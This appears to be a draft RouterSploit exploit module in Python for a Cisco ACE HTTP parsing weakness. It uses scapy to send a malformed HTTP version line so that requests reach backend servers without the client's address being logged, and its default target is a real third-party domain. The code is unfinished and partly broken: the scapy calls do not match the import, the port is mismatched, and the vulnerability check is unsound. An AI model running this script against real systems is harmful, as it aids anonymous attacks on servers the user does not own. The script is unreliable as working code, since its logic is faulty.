# -*- coding:utf-8 -*-
# Why didn't add above line in HTTP PoC(s)?!
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    mute,
    validators,
)

# import requests
# Requests can't send self-modify HTTP protocol version string, using scapy

from scapy.all import *


# import requests
# Requests can't send self-modify HTTP protocol version string, using scapy

class Exploit(exploits.Exploit):
    """
    This exploit targets a weakness in the Cisco ACE.
    """
    __info__ = {
        'name': 'Cisco ACE HTTP Parsing Security Weakness',
        'description': [
            'When used as a Server Load Balancer and/or SSL offloader it\'s possible to do \n'
            'requests to the backend without leaving any ip address in the http server logs.\n'
            'it\'s possible then to do any L7 http attacks anonymousely.',
        ],
        'authors': [
            'Alexis Tremblay' 
        ],
        'references': [
            'https://www.securityfocus.com/bid/40002/info',
        ],
        'devices': [
            'Cisco ACE Application Control Engine Module 3.0(0)A2(2.3)',
            'Cisco ACE Application Control Engine Module 3.0(0)A2(2.2.28)',
            'Cisco ACE Appliance 0',
            'Cisco ACE 4710 Appliance A3(2.1)',
            'Cisco ACE 4710 Appliance A2(3.0)',
            'Cisco ACE 4710 Appliance A1(8a)',
            'Cisco ACE 4710 Appliance A1(8.0)',
            'Cisco ACE 4710 Appliance 0',
        ],
        'id': 'sf-40002',
    }

    target = exploits.Option('www.baidu.com', 'Target domain-name e.g. www.baidu.com',
                             validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    http_header_weakness = exploits.Option("GET / HTTP / 1 . 1\\r\\n",
                                           'Http header weakness security parser validator')
    response = None

    def run(self):
        # TODO: UNITEST - FUNC TEST - CASE 02 -- Exploition test
        chk, err = self.check()
        # TOOD: for debug only, comment next line after test.
        if chk > 0:
            if self.response is not None:
                print_success("Target is VULNERABLE!")
                return True
            else:
                if err is not None:
                    print_error("Target may not in suffer")
                    return False
                else:
                    print_error("Something go wrong...Oops")
                    return False
        else:
            print_error("Connection Failed, Cancel...")
            return False

    @mute
    def check(self):
        # TODO: for debug only, comment next line after test.
        chk_result = 0
        # Make a new validator for check Internet Connectivity!
        if validators.public_connectivity(validators.url(self.target)) == 200:
            chk_result += 1
        else:
            return -1, -1  # Connection down, exploition stop!

        # Check function (or procedure) can be running at first!
        # Some HTTP PoC, the check() same with run(). Or check() is called by run().

        request = self.http_header_weakness + 'Host: ' + self.target + '\\r\\n\\r\\n'

        print_status('Sending request with special HTTP Header')
        # WTF!!!!! Running IDE with ROOT Privileges, for scapy running well ...
        # TODO: UNITEST - FUNC TEST - CASE 01 -- Scapy running well or not

        pkt = scapy.IP(dst=str(self.target)) / scapy.TCP(dport=443) / request
        self.response, error = scapy.send(pkt)

        return chk_result, error  # target is not vulnerable
